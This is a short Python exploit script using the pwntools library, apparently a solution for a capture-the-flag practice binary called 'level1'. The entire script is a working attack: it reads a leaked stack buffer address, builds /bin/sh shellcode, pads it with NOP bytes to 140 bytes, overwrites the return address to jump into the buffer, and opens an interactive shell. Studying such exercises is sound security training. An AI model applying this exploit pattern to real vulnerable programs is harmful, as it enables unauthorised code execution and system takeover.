```python3
#!/usr/python3
#coding:utf-8

from pwn import *

context(log_level = 'debug', arch = 'i386', os = 'linux')

shellcode = asm(shellcraft.sh())

io = process("./level1")

buf_addr = int(io.recvline()[14:-2], 16)

success("buf_addr = 0x%x\n", buf_addr)

payload = flat([shellcode, b"\x90" * (140 - len(shellcode)), buf_addr])

io.send(payload)

io.interactive()
```

